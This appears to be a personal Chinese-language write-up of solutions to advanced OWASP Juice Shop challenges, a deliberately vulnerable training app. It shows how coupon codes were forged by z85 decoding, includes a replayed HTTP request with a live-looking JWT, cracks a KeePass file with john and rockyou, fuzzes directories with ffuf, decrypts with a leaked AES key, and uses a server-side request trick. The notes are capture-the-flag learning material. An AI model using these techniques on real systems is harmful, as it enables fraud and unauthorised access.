# juicyshop 六星挑戰


```
https://pwning.owasp-juice.shop/companion-guide/latest/appendix/solutions.html

docker run --rm -p 3000:3000 bkimminich/juice-shop

192.168.50.237:3000
```









## 覆蓋法律資訊文件
docker 無法

## 偽造優惠券代碼，為您提供至少 80% 的折扣


```
根據package.json

找到
"z85": "~0.0"
```

查看官方文檔
https://www.npmjs.com/package/z85




```
coupons_2013.md.bak共12個，可能是 2013 12月份

n<MibgC7sn
mNYS#gC7sn
o*IVigC7sn
k#pDlgC7sn
o*I]pgC7sn
n(XRvgC7sn
n(XLtgC7sn
k#*AfgC7sn
q:<IqgC7sn
pEw8ogC7sn
pes[BgC7sn
l}6D$gC7ss




z85 decode
https://cryptii.com/pipes/z85-encoder

JAN13-10
FEB13-10
MAR13-10
APR13-10
MAY13-10
JUN13-10
JUL13-10
AUG13-10
SEP13-10
OCT13-10
NOV13-10
DEC13-15





根據現在時間偽造一個 85%折扣
JAN24-85
n<Micg+yWA
```






## 解決挑戰＃999


這題教你hashids
```
PUT /rest/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj HTTP/1.1
Host: 192.168.50.237:3000
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: language=zh_TW; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=KOhmtaIBC5iaSrUVH5tyc5I2TqCNsvizfLSlUDHJuwhJt6I6TWCQsNFpSlUOH2zugghEOtLBc6zI3pTOYFErfk1Hgou9YhB5tlYIQEC6jFEJiQjf2rSneUyvH5qtk5c6OTo4syPFbjiavUPgubjhy2cPeCwpskgF63i9Qf5gUeBHYNuNEh4JtvQcR4IQo; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiIzMzQ1Njc4QGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNWZlMjIyYTA1YjI0OGQ0MDlkZTI5Y2E1MWYwMDkxMTUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI0LTAxLTI5IDAzOjQ0OjAyLjQzMCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI0LTAxLTI5IDAzOjQ0OjAyLjQzMCArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3MDY0OTk4NTB9.ndGW1GCBAwDsuVyHvPIpDWOb9Cdj_npZ6Bh1YFCvPrpLL_B9L4HOdW5tzO0LEFHt-SHFVPMMeOkg_wW_TaIb9V0ub_EcgCJoIBGOsmC1uV8cCm6jEGbLz4Pu8y_VamNtR8-JPvUSxW3GhYj5pD08_p_tjddUJswqfvj6Oy6LwVI
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```













## 偽造幾乎正確的 RSA 簽章 JWT 令牌

失敗。











## 同一用戶對任何評論至少按 3 次

使用 zap 

先用一個帳號按讚，抓包記住  json ID 
然後再換另一個帳號修改 Authorization，用同ID fuzzer發送。








## 使用支援團隊的原始使用者憑證登錄

sudo keepass2john incident-support.kdbx > ~/Desktop/output.txt

john --wordlist=/usr/share/wordlists/rockyou.txt output.txt







## 解鎖高級挑戰以存取獨家內容
OK

ffuf 找出目錄 encryptionkeys
```
ffuf -u http://127.0.0.1:3000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -t 4 -rate 50 -c  -o ~/Desktop/test.csv -of csv -fw 266
```





```
開啟http://localhost:3000/encryptionkeys/premium.key以擷取 AES 加密金鑰EA99A61D92D2955B1E9285B55BF2AD42 和 IV 1337
```


openssl 解密 CBC 模式下使用 AES256 進行 AES 加密得出的密文
```
echo "IvLuRfBJYlmStf9XfL6ckJFngyd9LfV1JaaN/KRTPQPidTuJ7FR+D/nkWJUF+0xUF07CeCeqYfxq+OJVVa0gNbqgYkUNvn//UbE7e95C+6e+7GtdpqJ8mqm4WcPvUGIUxmGLTTAC2+G9UuFCD1DUjg==" | openssl enc -d -aes-256-cbc -K EA99A61D92D2955B1E9285B55BF2AD42 -iv 1337133713371337 -a -A




echo: 输出字符串。
openssl enc -d: 使用 OpenSSL 进行解密操作。
-aes-256-cbc: 指定要使用 AES-256-CBC 加密算法。
-K EA99A61D92D2955B1E9285B55BF2AD42: 指定加密密钥，这里的密钥是 EA99A61D92D2955B1E9285B55BF2AD42。
-iv 1337133713371337: 指定初始化向量（IV），这里的 IV 是 1337133713371337。
-a: 表示输入输出都是 base64 编码。
-A: 表示不在输出的行末添加换行符，以避免在输出中出现额外的换行符。




結果
/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us

```





## 執行遠端程式碼執行，佔用伺服器一段時間，而不使用無限循環
docker 無法

## 透過伺服器請求伺服器上的隱藏資源

http://192.168.50.237:3000/profile 這裡有個 image url
```
http://192.168.50.237:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3
```



## 透過濫用任意指令執行，用有趣的惡意軟體感染伺服器
docker 無法


## 將 XSS 有效負載嵌入到我們的宣傳影片中
docker 無法

## 從新錢包中提取的 ETH 數量
OK